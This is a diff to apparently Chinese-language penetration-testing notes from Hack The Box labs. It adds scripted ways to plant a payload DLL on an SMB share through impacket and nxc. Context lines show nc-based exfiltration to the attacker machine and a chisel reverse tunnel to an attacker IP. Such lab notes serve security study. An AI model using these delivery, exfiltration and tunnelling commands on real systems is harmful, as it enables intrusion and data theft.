@@ -49,6 +49,27 @@ foreach($f in @("CheckPort.exe","KrbRelay.exe","RunasCs.exe","BouncyCastle.Crypt
 
 evil-winrm 另两条实测细节（来源：HTB-Absolute）：① 支持**管道非交互执行**——`printf '%s\n' 'whoami' 'exit' | evil-winrm -i <dc> -r <REALM>`，适合脚本化验证；② 会话**起始目录是 `C:\Users\<user>\Documents`**，`.\tool.exe` 会 `not recognized`，先 `cd` 或写绝对路径；③ Windows 工具带依赖 DLL 时（如 KrbRelay）**DLL 必须与 exe 同目录**，否则 `FileNotFoundException`。
 
+**脚本化投递（impacket / nxc，来源：HTB-Hathor）**：把文件投到 SMB 共享时，**别用交互式 `impacket-smbclient` 喂管道**（`printf 'use share\nput …\nexit\n' | impacket-smbclient -k …` 实测会卡住不返回）；改用以下两种：
+
+```python
+# ① impacket 直连（Kerberos ccache 认证），适合嵌进脚本
+from impacket.smbconnection import SMBConnection
+c = SMBConnection('<fqdn>', '<fqdn>')
+c.kerberosLogin('', '', '<domain>', '', '', useCache=True)          # 依赖 KRB5CCNAME
+c.putFile('share', r'scripts\payload.dll', open('local.dll','rb').read)
+# 取回同理：c.getFile('share', r'result.txt', write_callback) —— getFile 需要回调参数
+```
+
+```bash
+# ② nxc（支持指定远端名）
+export KRB5CCNAME=/tmp/krb5cc_1000
+nxc smb <fqdn> --use-kcache --share share --put-file ./payload.txt '\payload.txt'
+nxc smb <fqdn> --use-kcache --share share --get-file '\result.txt' ./result.txt   # 顺序：远端 → 本地
+```
+
+- **`impacket-smbclient` 的 `put` 只接受一个参数**（本地路径，可为绝对路径；**远端名 = 本地 basename**，落到**远端当前目录**）。要远端改名就把本地文件先改名（`shell cp a b` 是本地执行）；只有 samba 版 smbclient 支持 `put local remote`。
+- `--use-kcache` / `-k` 需要 `KRB5CCNAME` 指向 ccache；文件类操作用 nxc 时**必须带 `--share`**。
+
 **出向回传**（靶机 → kali）：nc 重定向（`nc -lvnp 81 \| tee out`，呼应 LinPEAS 无痕回传）。
 
 **隧道（出口受限时）**：chisel 反向隧道——kali `chisel server -p 9595 --reverse`，靶机 `chisel.exe client 10.10.16.58:9595 R:127.0.0.1:1443`（来源：传输文件）。域内隧道（mssqlproxy/proxychains）见 `references/notes/ad-post-compromise.md` §6。
